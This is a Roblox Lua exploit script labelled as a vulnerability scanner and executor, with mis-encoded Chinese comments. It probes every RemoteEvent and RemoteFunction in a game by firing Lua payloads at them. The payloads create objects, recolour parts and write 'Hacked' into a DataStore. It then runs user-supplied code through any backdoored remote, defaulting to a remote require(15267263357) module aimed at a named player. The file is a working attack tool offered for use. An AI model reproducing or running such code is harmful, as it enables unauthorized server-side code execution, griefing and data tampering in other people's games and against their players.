-- é«˜çº§æ¼æ´æ‰«ææ‰§è¡Œå™¨ v4.1 - å¸¦ç›®æ ‡å¯¹è±¡è¾“å…¥
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local ServerStorage = game:GetService("ServerStorage")
local StarterPlayer = game:GetService("StarterPlayer")
local StarterPack = game:GetService("StarterPack")
local TextService = game:GetService("TextService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

-- åˆ›å»ºå¢å¼ºç‰ˆä¸»ç•Œé¢
local function createAdvancedScannerUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AdvancedVulnerabilityScanner"
    screenGui.Parent = CoreGui
    
    -- ä¸»çª—å£
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 500, 0, 700)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -350)
    mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui
    
    -- æ ‡é¢˜æ 
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 35)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -60, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "é«˜çº§æ¼æ´æ‰«ææ‰§è¡Œå™¨ v4.1"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    titleLabel.Parent = titleBar
    
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -30, 0, 0)
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Parent = titleBar
    
    -- çŠ¶æ€æŒ‡ç¤ºå™¨
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0.9, 0, 0, 70)
    statusFrame.Position = UDim2.new(0.05, 0, 0.07, 0)
    statusFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    statusFrame.BorderSizePixel = 0
    statusFrame.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0.5, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "å‡†å¤‡æ‰«æ"
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 16
    statusLabel.Parent = statusFrame
    
    local statusLight = Instance.new("Frame")
    statusLight.Size = UDim2.new(0, 20, 0, 20)
    statusLight.Position = UDim2.new(0.5, -10, 0.7, 0)
    statusLight.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
    statusLight.BorderSizePixel = 0
    statusLight.Parent = statusFrame
    
    local progressLabel = Instance.new("TextLabel")
    progressLabel.Size = UDim2.new(1, 0, 0, 20)
    progressLabel.Position = UDim2.new(0, 0, 0.9, 0)
    progressLabel.BackgroundTransparency = 1
    progressLabel.Text = "è¿›åº¦: 0%"
    progressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressLabel.Font = Enum.Font.Gotham
    progressLabel.TextSize = 12
    progressLabel.Parent = statusFrame
    
    -- æ§åˆ¶æŒ‰é’®åŒºåŸŸ
    local controlsFrame = Instance.new("Frame")
    controlsFrame.Size = UDim2.new(0.9, 0, 0, 150)
    controlsFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    controlsFrame.BackgroundTransparency = 1
    controlsFrame.Parent = mainFrame
    
    -- æ‰«ææŒ‰é’®
    local scanButton = Instance.new("TextButton")
    scanButton.Size = UDim2.new(1, 0, 0, 35)
    scanButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    scanButton.Text = "å¼€å§‹å…¨é¢æ‰«æ"
    scanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    scanButton.Font = Enum.Font.Gotham
    scanButton.TextSize = 14
    scanButton.Parent = controlsFrame
    
    -- å¿«é€Ÿæ£€æµ‹æŒ‰é’®
    local quickScanButton = Instance.new("TextButton")
    quickScanButton.Size = UDim2.new(0.48, 0, 0, 35)
    quickScanButton.Position = UDim2.new(0, 0, 0, 40)
    quickScanButton.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
    quickScanButton.Text = "å¿«é€Ÿæ£€æµ‹"
    quickScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    quickScanButton.Font = Enum.Font.Gotham
    quickScanButton.TextSize = 14
    quickScanButton.Parent = controlsFrame
    
    -- æ·±åº¦æ‰«ææŒ‰é’®
    local deepScanButton = Instance.new("TextButton")
    deepScanButton.Size = UDim2.new(0.48, 0, 0, 35)
    deepScanButton.Position = UDim2.new(0.52, 0, 0, 40)
    deepScanButton.BackgroundColor3 = Color3.fromRGB(180, 80, 80)
    deepScanButton.Text = "æ·±åº¦æ‰«æ"
    deepScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    deepScanButton.Font = Enum.Font.Gotham
    deepScanButton.TextSize = 14
    deepScanButton.Parent = controlsFrame
    
    -- é«˜çº§æ‰«ææŒ‰é’®
    local advancedScanButton = Instance.new("TextButton")
    advancedScanButton.Size = UDim2.new(1, 0, 0, 35)
    advancedScanButton.Position = UDim2.new(0, 0, 0, 80)
    advancedScanButton.BackgroundColor3 = Color3.fromRGB(160, 80, 160)
    advancedScanButton.Text = "é«˜çº§æ‰«æ"
    advancedScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    advancedScanButton.Font = Enum.Font.Gotham
    advancedScanButton.TextSize = 14
    advancedScanButton.Parent = controlsFrame
    
    -- åœæ­¢æ‰«ææŒ‰é’®
    local stopScanButton = Instance.new("TextButton")
    stopScanButton.Size = UDim2.new(1, 0, 0, 35)
    stopScanButton.Position = UDim2.new(0, 0, 0, 120)
    stopScanButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    stopScanButton.Text = "åœæ­¢æ‰«æ"
    stopScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopScanButton.Font = Enum.Font.Gotham
    stopScanButton.TextSize = 14
    stopScanButton.Parent = controlsFrame
    
    -- æ¼æ´åˆ—è¡¨åŒºåŸŸ
    local vulnListFrame = Instance.new("Frame")
    vulnListFrame.Size = UDim2.new(0.9, 0, 0, 150)
    vulnListFrame.Position = UDim2.new(0.05, 0, 0.45, 0)
    vulnListFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    vulnListFrame.BorderSizePixel = 0
    vulnListFrame.Parent = mainFrame
    
    local vulnListLabel = Instance.new("TextLabel")
    vulnListLabel.Size = UDim2.new(1, 0, 0, 25)
    vulnListLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    vulnListLabel.Text = "å‘ç°çš„æ¼æ´ (" .. 0 .. ")"
    vulnListLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    vulnListLabel.Font = Enum.Font.Gotham
    vulnListLabel.TextSize = 12
    vulnListLabel.Parent = vulnListFrame
    
    local vulnScrollFrame = Instance.new("ScrollingFrame")
    vulnScrollFrame.Size = UDim2.new(1, -10, 1, -35)
    vulnScrollFrame.Position = UDim2.new(0, 5, 0, 25)
    vulnScrollFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    vulnScrollFrame.BorderSizePixel = 0
    vulnScrollFrame.ScrollBarThickness = 8
    vulnScrollFrame.Parent = vulnListFrame
    
    local vulnListLayout = Instance.new("UIListLayout")
    vulnListLayout.Parent = vulnScrollFrame
    
    -- ç›®æ ‡å¯¹è±¡è¾“å…¥åŒºåŸŸ
    local targetFrame = Instance.new("Frame")
    targetFrame.Size = UDim2.new(0.9, 0, 0, 50)
    targetFrame.Position = UDim2.new(0.05, 0, 0.72, 0)
    targetFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    targetFrame.BorderSizePixel = 0
    targetFrame.Parent = mainFrame
    
    local targetLabel = Instance.new("TextLabel")
    targetLabel.Size = UDim2.new(1, 0, 0, 25)
    targetLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    targetLabel.Text = "ç›®æ ‡å¯¹è±¡:"
    targetLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    targetLabel.Font = Enum.Font.Gotham
    targetLabel.TextSize = 12
    targetLabel.Parent = targetFrame
    
    local targetBox = Instance.new("TextBox")
    targetBox.Size = UDim2.new(1, -10, 1, -25)
    targetBox.Position = UDim2.new(0, 5, 0, 25)
    targetBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    targetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    targetBox.Text = LocalPlayer.Name  -- é»˜è®¤å¡«å…¥å½“å‰ç©å®¶åç§°
    targetBox.PlaceholderText = "è¾“å…¥ç›®æ ‡ç©å®¶åç§°æˆ–å¯¹è±¡ID"
    targetBox.Font = Enum.Font.Gotham
    targetBox.TextSize = 12
    targetBox.Parent = targetFrame
    
    -- è„šæœ¬è¾“å…¥åŒºåŸŸ
    local scriptFrame = Instance.new("Frame")
    scriptFrame.Size = UDim2.new(0.9, 0, 0, 120)
    scriptFrame.Position = UDim2.new(0.05, 0, 0.78, 0)
    scriptFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
    scriptFrame.BorderSizePixel = 0
    scriptFrame.Parent = mainFrame
    
    local scriptLabel = Instance.new("TextLabel")
    scriptLabel.Size = UDim2.new(1, 0, 0, 25)
    scriptLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    scriptLabel.Text = "æ‰§è¡Œè„šæœ¬:"
    scriptLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptLabel.Font = Enum.Font.Gotham
    scriptLabel.TextSize = 12
    scriptLabel.Parent = scriptFrame
    
    local scriptBox = Instance.new("TextBox")
    scriptBox.Size = UDim2.new(1, -10, 1, -35)
    scriptBox.Position = UDim2.new(0, 5, 0, 25)
    scriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    scriptBox.Text = 'require(15267263357).V11("")'
    scriptBox.MultiLine = true
    scriptBox.TextWrapped = true
    scriptBox.TextXAlignment = Enum.TextXAlignment.Left
    scriptBox.TextYAlignment = Enum.TextYAlignment.Top
    scriptBox.Font = Enum.Font.Code
    scriptBox.TextSize = 12
    scriptBox.Parent = scriptFrame
    
    -- æ‰§è¡Œæ§åˆ¶åŒºåŸŸ
    local executeFrame = Instance.new("Frame")
    executeFrame.Size = UDim2.new(0.9, 0, 0, 80)
    executeFrame.Position = UDim2.new(0.05, 0, 0.92, 0)
    executeFrame.BackgroundTransparency = 1
    executeFrame.Parent = mainFrame
    
    local executeButton = Instance.new("TextButton")
    executeButton.Size = UDim2.new(0.48, 0, 0, 35)
    executeButton.BackgroundColor3 = Color3.fromRGB(215, 80, 80)
    executeButton.Text = "æ‰§è¡Œè„šæœ¬"
    executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    executeButton.Font = Enum.Font.GothamBold
    executeButton.TextSize = 14
    executeButton.Parent = executeFrame
    
    local clearButton = Instance.new("TextButton")
    clearButton.Size = UDim2.new(0.48, 0, 0, 35)
    clearButton.Position = UDim2.new(0.52, 0, 0, 0)
    clearButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
    clearButton.Text = "æ¸…ç©º"
    clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearButton.Font = Enum.Font.Gotham
    clearButton.TextSize = 14
    clearButton.Parent = executeFrame
    
    local resultLabel = Instance.new("TextLabel")
    resultLabel.Size = UDim2.new(1, 0, 0, 35)
    resultLabel.Position = UDim2.new(0, 0, 0, 45)
    resultLabel.BackgroundTransparency = 1
    resultLabel.Text = "å°±ç»ª"
    resultLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    resultLabel.Font = Enum.Font.Gotham
    resultLabel.TextSize = 12
    resultLabel.Parent = executeFrame
    
    return {
        UI = screenGui,
        Elements = {
            statusLabel = statusLabel,
            statusLight = statusLight,
            progressLabel = progressLabel,
            scanButton = scanButton,
            quickScanButton = quickScanButton,
            deepScanButton = deepScanButton,
            advancedScanButton = advancedScanButton,
            stopScanButton = stopScanButton,
            vulnListLabel = vulnListLabel,
            vulnScrollFrame = vulnScrollFrame,
            targetBox = targetBox,
            scriptBox = scriptBox,
            executeButton = executeButton,
            clearButton = clearButton,
            resultLabel = resultLabel,
            closeButton = closeButton
        }
    }
end

-- åˆå§‹åŒ–æ‰«æå™¨
local Scanner = createAdvancedScannerUI()
local scanInProgress = false
local detectedVulnerabilities = {}
local totalObjectsScanned = 0
local totalObjectsToScan = 0

-- é€šçŸ¥å‡½æ•°
local function notify(message)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "é«˜çº§æ¼æ´æ‰«æå™¨",
            Text = message,
            Duration = 3
        })
    end)
    Scanner.Elements.resultLabel.Text = message
end

-- æ›´æ–°çŠ¶æ€
local function updateStatus(text, color)
    Scanner.Elements.statusLabel.Text = text
    Scanner.Elements.statusLight.BackgroundColor3 = color
end

-- æ›´æ–°è¿›åº¦
local function updateProgress(current, total)
    if total > 0 then
        local percent = math.floor((current / total) * 100)
        Scanner.Elements.progressLabel.Text = "è¿›åº¦: " .. percent .. "%"
    end
end

-- æ›´æ–°æ¼æ´åˆ—è¡¨
local function updateVulnerabilityList()
    Scanner.Elements.vulnListLabel.Text = "å‘ç°çš„æ¼æ´ (" .. #detectedVulnerabilities .. ")"
    
    -- æ¸…ç©ºç°æœ‰åˆ—è¡¨
    for _, child in ipairs(Scanner.Elements.vulnScrollFrame:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    -- æ·»åŠ æ¼æ´é¡¹
    for i, vuln in ipairs(detectedVulnerabilities) do
        local vulnButton = Instance.new("TextButton")
        vulnButton.Size = UDim2.new(1, 0, 0, 40) -- å¢åŠ é«˜åº¦ä»¥æ˜¾ç¤ºæ›´å¤šä¿¡æ¯
        vulnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
        vulnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        vulnButton.Text = vuln.name .. "\n" .. vuln.exploitInfo
        vulnButton.TextXAlignment = Enum.TextXAlignment.Left
        vulnButton.TextYAlignment = Enum.TextYAlignment.Top
        vulnButton.Font = Enum.Font.Gotham
        vulnButton.TextSize = 10
        vulnButton.Parent = Scanner.Elements.vulnScrollFrame
        
        -- æ‚¬åœæç¤º
        vulnButton.MouseEnter:Connect(function()
            vulnButton.BackgroundColor3 = Color3.fromRGB(80, 80, 85)
        end)
        
        vulnButton.MouseLeave:Connect(function()
            vulnButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
        end)
        
        -- ç‚¹å‡»æ¼æ´é¡¹è‡ªåŠ¨å¡«å…¥æµ‹è¯•è„šæœ¬
        vulnButton.MouseButton1Click:Connect(function()
            if vuln.exploitInfo:find("ä»£ç æ‰§è¡Œ") or vuln.exploitInfo:find("ä»»æ„è„šæœ¬") then
                local target = Scanner.Elements.targetBox.Text
                Scanner.Elements.scriptBox.Text = 'require(15267263357).V11("' .. target .. '")'
                notify("å·²è‡ªåŠ¨å¡«å…¥ä½ çš„è„šæœ¬ï¼Œç›®æ ‡: " .. target)
            else
                Scanner.Elements.scriptBox.Text = vuln.testPayload
                notify("å·²è‡ªåŠ¨å¡«å…¥æµ‹è¯•è„šæœ¬")
            end
        end)
    end
    
    -- æ›´æ–°æ»šåŠ¨åŒºåŸŸå¤§å°
    Scanner.Elements.vulnScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #detectedVulnerabilities * 40)
end

-- æ‰©å±•çš„è¿œç¨‹å¯¹è±¡éªŒè¯
local function checkRemoteObject(obj)
    if obj.ClassName ~= "RemoteEvent" and obj.ClassName ~= "RemoteFunction" then
        return false
    end
    
    -- æ’é™¤ç³»ç»Ÿå¯¹è±¡
    if obj:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
        return false
    end
    
    -- æ£€æŸ¥æ‰€æœ‰è¿œç¨‹å¯¹è±¡ï¼Œä¸é™äºç‰¹å®šåç§°æ¨¡å¼
    return true
end

-- å¢å¼ºçš„æ¼æ´æµ‹è¯•æ–¹æ³•ï¼Œè¿”å›æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨æ–¹å¼
local function testVulnerability(remote)
    local testId = "Test_" .. tostring(math.random(10000, 99999))
    local vulnerabilityFound = false
    local vulnerabilityType = ""
    local exploitInfo = ""
    local testPayload = ""
    
    -- æµ‹è¯•æ–¹æ³•1: åŸºæœ¬ä»£ç æ‰§è¡Œ - åˆ›å»ºéƒ¨ä»¶
    local testCode1 = string.format(
        "local p=Instance.new('Part',workspace)p.Name='%s'",
        testId
    )
    
    local success1 = pcall(function()
        if remote.ClassName == "RemoteEvent" then
            remote:FireServer(testCode1)
        else
            remote:InvokeServer(testCode1)
        end
    end)
    
    if success1 then
        wait(0.3)
        if Workspace:FindFirstChild(testId) then
            Workspace:FindFirstChild(testId):Destroy()
            vulnerabilityFound = true
            vulnerabilityType = "ä»£ç æ‰§è¡Œ"
            exploitInfo = "âœ… å®Œå…¨ä»£ç æ‰§è¡Œ - å¯ä»¥æ‰§è¡Œä»»æ„Luaä»£ç "
            testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
        end
    end
    
    -- æµ‹è¯•æ–¹æ³•2: å­—ç¬¦ä¸²å€¼åˆ›å»º
    if not vulnerabilityFound then
        local testCode2 = string.format(
            "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='SUCCESS'",
            testId
        )
        
        local success2 = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode2)
            else
                remote:InvokeServer(testCode2)
            end
        end)
        
        if success2 then
            wait(0.3)
            local testObj = Workspace:FindFirstChild(testId)
            if testObj and testObj.Value == "SUCCESS" then
                testObj:Destroy()
                vulnerabilityFound = true
                vulnerabilityType = "ä»£ç æ‰§è¡Œ"
                exploitInfo = "âœ… å®Œå…¨ä»£ç æ‰§è¡Œ - å¯ä»¥æ‰§è¡Œä»»æ„Luaä»£ç "
                testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
            end
        end
    end
    
    -- æµ‹è¯•æ–¹æ³•3: ä¿®æ”¹å±æ€§
    if not vulnerabilityFound then
        local testPart = Instance.new("Part")
        testPart.Name = testId
        testPart.Parent = Workspace
        
        local testCode3 = string.format(
            "workspace['%s'].BrickColor=BrickColor.new('Bright red')",
            testId
        )
        
        local success3 = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode3)
            else
                remote:InvokeServer(testCode3)
            end
        end)
        
        if success3 then
            wait(0.3)
            if testPart.BrickColor == BrickColor.new("Bright red") then
                vulnerabilityFound = true
                vulnerabilityType = "å±æ€§ä¿®æ”¹"
                exploitInfo = "âš ï¸ å±æ€§ä¿®æ”¹æƒé™ - å¯ä»¥ä¿®æ”¹æ¸¸æˆå¯¹è±¡å±æ€§"
                testPayload = "workspace.Baseplate.BrickColor = BrickColor.new('Bright green')"
            end
        end
        
        testPart:Destroy()
    end
    
    -- æµ‹è¯•æ–¹æ³•4: æœåŠ¡ç«¯å‡½æ•°è°ƒç”¨
    if not vulnerabilityFound then
        local testCode4 = "return game:GetService('Players'):GetChildren()"
        
        local success4, result = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode4)
                return true
            else
                return remote:InvokeServer(testCode4)
            end
        end)
        
        if success4 and result then
            vulnerabilityFound = true
            vulnerabilityType = "å‡½æ•°è°ƒç”¨"
            exploitInfo = "ğŸ”§ æœåŠ¡ç«¯å‡½æ•°è°ƒç”¨ - å¯ä»¥è°ƒç”¨æœåŠ¡ç«¯å‡½æ•°"
            testPayload = "game:GetService('Players'):GetChildren()"
        end
    end
    
    -- æµ‹è¯•æ–¹æ³•5: requireæ¨¡å—æ‰§è¡Œ
    if not vulnerabilityFound then
        local testCode5 = "require(0000000000)"
        
        local success5 = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode5)
            else
                remote:InvokeServer(testCode5)
            end
        end)
        
        if success5 then
            vulnerabilityFound = true
            vulnerabilityType = "æ¨¡å—åŠ è½½"
            exploitInfo = "ğŸ“¦ æ¨¡å—åŠ è½½æƒé™ - å¯ä»¥åŠ è½½æ¨¡å—ï¼Œä½†éœ€è¦æ­£ç¡®ID"
            testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
        end
    end
    
    -- æµ‹è¯•æ–¹æ³•6: æ•°æ®å­˜å‚¨æ“ä½œ
    if not vulnerabilityFound then
        local testCode6 = "game:GetService('DataStoreService'):GetDataStore('Test'):SetAsync('Test','Value')"
        
        local success6 = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode6)
            else
                remote:InvokeServer(testCode6)
            end
        end)
        
        if success6 then
            vulnerabilityFound = true
            vulnerabilityType = "æ•°æ®æ“ä½œ"
            exploitInfo = "ğŸ’¾ æ•°æ®å­˜å‚¨æƒé™ - å¯ä»¥è¯»å†™æ¸¸æˆæ•°æ®"
            testPayload = "game:GetService('DataStoreService'):GetDataStore('Global'):SetAsync('Test','Hacked')"
        end
    end
    
    -- æµ‹è¯•æ–¹æ³•7: ç‰¹å®šè„šæœ¬æµ‹è¯•
    if not vulnerabilityFound then
        local testCode7 = 'require(15267263357).V11("Test")'
        
        local success7 = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer(testCode7)
            else
                return remote:InvokeServer(testCode7)
            end
        end)
        
        if success7 then
            vulnerabilityFound = true
            vulnerabilityType = "ç‰¹å®šè„šæœ¬"
            exploitInfo = "ğŸ¯ æ”¯æŒç‰¹å®šè„šæœ¬ - å¯ä»¥ç›´æ¥æ‰§è¡Œä½ çš„requireè„šæœ¬"
            testPayload = 'require(15267263357).V11("' .. LocalPlayer.Name .. '")'
        end
    end
    
    if vulnerabilityFound then
        return true, vulnerabilityType, exploitInfo, testPayload
    end
    
    return false, "", "", ""
end

-- æ‰«æä½ç½®
local function scanLocation(location, scanType)
    local found = 0
    local objects = location:GetDescendants()
    
    for _, obj in ipairs(objects) do
        if not scanInProgress then break end
        
        totalObjectsScanned = totalObjectsScanned + 1
        updateProgress(totalObjectsScanned, totalObjectsToScan)
        
        if checkRemoteObject(obj) then
            local isVulnerable, vulnType, exploitInfo, testPayload = testVulnerability(obj)
            if isVulnerable then
                table.insert(detectedVulnerabilities, {
                    object = obj,
                    name = obj:GetFullName(),
                    type = vulnType,
                    exploitInfo = exploitInfo,
                    testPayload = testPayload,
                    location = location:GetFullName()
                })
                found = found + 1
                updateVulnerabilityList()
                
                if scanType == "quick" then
                    break -- å¿«é€Ÿæ‰«æåªæ‰¾ç¬¬ä¸€ä¸ªæ¼æ´
                end
            end
        end
    end
    
    return found
end

-- è®¡ç®—æ€»æ‰«æå¯¹è±¡æ•°
local function calculateTotalObjects()
    local total = 0
    local scanLocations = {
        ReplicatedStorage,
        Workspace,
        Lighting,
        ServerScriptService,
        ServerStorage,
        StarterPlayer,
        StarterPack,
        game:GetService("StarterGui"),
        game:GetService("SoundService"),
        game:GetService("Chat"),
        game:GetService("LocalizationService")
    }
    
    for _, location in ipairs(scanLocations) do
        total = total + #location:GetDescendants()
    end
    
    return total
end

-- æ‰§è¡Œæ‰«æ
local function performScan(scanType)
    if scanInProgress then
        notify("æ‰«ææ­£åœ¨è¿›è¡Œä¸­...")
        return
    end
    
    scanInProgress = true
    detectedVulnerabilities = {}
    totalObjectsScanned = 0
    updateVulnerabilityList()
    
    local scanLocations = {
        ReplicatedStorage,
        Workspace,
        Lighting,
        ServerScriptService,
        ServerStorage,
        StarterPlayer,
        StarterPack,
        game:GetService("StarterGui"),
        game:GetService("SoundService"),
        game:GetService("Chat"),
        game:GetService("LocalizationService")
    }
    
    if scanType == "quick" then
        scanLocations = {ReplicatedStorage, Workspace}
    elseif scanType == "deep" then
        -- æ·±åº¦æ‰«æåŒ…å«æ‰€æœ‰ä½ç½®
    elseif scanType == "advanced" then
        -- é«˜çº§æ‰«æé¢å¤–æ‰«ææ¸¸æˆæœ¬èº«
        table.insert(scanLocations, game)
    end
    
    totalObjectsToScan = calculateTotalObjects()
    updateStatus("æ‰«æä¸­...", Color3.fromRGB(255, 255, 0))
    updateProgress(0, totalObjectsToScan)
    
    local totalFound = 0
    
    -- æ‰§è¡Œæ‰«æ
    for _, location in ipairs(scanLocations) do
        if not scanInProgress then break end
        
        local found = scanLocation(location, scanType)
        totalFound = totalFound + found
        
        if scanType == "quick" and totalFound > 0 then
            break -- å¿«é€Ÿæ‰«ææ‰¾åˆ°ç¬¬ä¸€ä¸ªå°±åœæ­¢
        end
    end
    
    scanInProgress = false
    
    -- æ˜¾ç¤ºç»“æœ
    if totalFound > 0 then
        updateStatus("å‘ç° " .. totalFound .. " ä¸ªæ¼æ´", Color3.fromRGB(0, 255, 0))
        
        -- æ£€æŸ¥æ˜¯å¦æœ‰å¯ä»¥ç›´æ¥æ‰§è¡Œä½ çš„è„šæœ¬çš„æ¼æ´
        local canExecuteScript = false
        for _, vuln in ipairs(detectedVulnerabilities) do
            if vuln.exploitInfo:find("âœ…") or vuln.exploitInfo:find("ğŸ¯") then
                canExecuteScript = true
                break
            end
        end
        
        if canExecuteScript then
            notify("å‘ç°å¯ä»¥æ‰§è¡Œä½ è„šæœ¬çš„æ¼æ´! ç‚¹å‡»æ¼æ´é¡¹è‡ªåŠ¨å¡«å…¥è„šæœ¬")
        else
            notify("å‘ç° " .. totalFound .. " ä¸ªå®‰å…¨æ¼æ´!")
        end
    else
        updateStatus("æœªå‘ç°æ¼æ´", Color3.fromRGB(255, 0, 0))
        notify("æ‰«æå®Œæˆ - æœªå‘ç°æ¼æ´")
    end
    
    return totalFound
end

-- æ‰§è¡Œè„šæœ¬
local function executeScript()
    if #detectedVulnerabilities == 0 then
        notify("æœªå‘ç°å¯ç”¨æ¼æ´ï¼Œè¯·å…ˆæ‰«æ")
        return
    end
    
    local scriptText = Scanner.Elements.scriptBox.Text
    if scriptText == "" then
        notify("è¯·è¾“å…¥è¦æ‰§è¡Œçš„è„šæœ¬")
        return
    end
    
    updateStatus("æ‰§è¡Œä¸­...", Color3.fromRGB(255, 165, 0))
    
    local successCount = 0
    local failCount = 0
    
    -- å°è¯•åœ¨æ‰€æœ‰å‘ç°çš„æ¼æ´ä¸Šæ‰§è¡Œ
    for i, vuln in ipairs(detectedVulnerabilities) do
        local success, result = pcall(function()
            if vuln.object.ClassName == "RemoteEvent" then
                vuln.object:FireServer(scriptText)
            else
                vuln.object:InvokeServer(scriptText)
            end
        end)
        
        if success then
            successCount = successCount + 1
            -- ç‰¹åˆ«æ ‡è®°å¯ä»¥æ‰§è¡Œä½ è„šæœ¬çš„æ¼æ´
            if scriptText:find("15267263357") and (vuln.exploitInfo:find("âœ…") or vuln.exploitInfo:find("ğŸ¯")) then
                notify("âœ… ä½ çš„è„šæœ¬å¯èƒ½å·²é€šè¿‡ " .. vuln.name .. " æ‰§è¡Œ")
            end
        else
            failCount = failCount + 1
        end
    end
    
    updateStatus("æ‰§è¡Œå®Œæˆ", Color3.fromRGB(0, 255, 0))
    notify(string.format("æ‰§è¡Œç»“æœ: %d æˆåŠŸ, %d å¤±è´¥", successCount, failCount))
end

-- åœæ­¢æ‰«æ
local function stopScan()
    scanInProgress = false
    updateStatus("å·²åœæ­¢", Color3.fromRGB(255, 0, 0))
    notify("æ‰«æå·²åœæ­¢")
end

-- ç»‘å®šäº‹ä»¶
Scanner.Elements.scanButton.MouseButton1Click:Connect(function()
    performScan("normal")
end)

Scanner.Elements.quickScanButton.MouseButton1Click:Connect(function()
    performScan("quick")
end)

Scanner.Elements.deepScanButton.MouseButton1Click:Connect(function()
    performScan("deep")
end)

Scanner.Elements.advancedScanButton.MouseButton1Click:Connect(function()
    performScan("advanced")
end)

Scanner.Elements.stopScanButton.MouseButton1Click:Connect(stopScan)

Scanner.Elements.executeButton.MouseButton1Click:Connect(executeScript)

Scanner.Elements.clearButton.MouseButton1Click:Connect(function()
    Scanner.Elements.scriptBox.Text = 'require(15267263357).V11("")'
    notify("å·²é‡ç½®è„šæœ¬")
end)

Scanner.Elements.closeButton.MouseButton1Click:Connect(function()
    Scanner.UI:Destroy()
end)

-- å½“ç›®æ ‡å¯¹è±¡æ”¹å˜æ—¶ï¼Œè‡ªåŠ¨æ›´æ–°è„šæœ¬
Scanner.Elements.targetBox:GetPropertyChangedSignal("Text"):Connect(function()
    local target = Scanner.Elements.targetBox.Text
    if target ~= "" then
        Scanner.Elements.scriptBox.Text = 'require(15267263357).V11("' .. target .. '")'
    else
        Scanner.Elements.scriptBox.Text = 'require(15267263357).V11("")'
    end
end)

-- åˆå§‹åŒ–å®Œæˆ
updateStatus("å°±ç»ª", Color3.fromRGB(255, 255, 0))
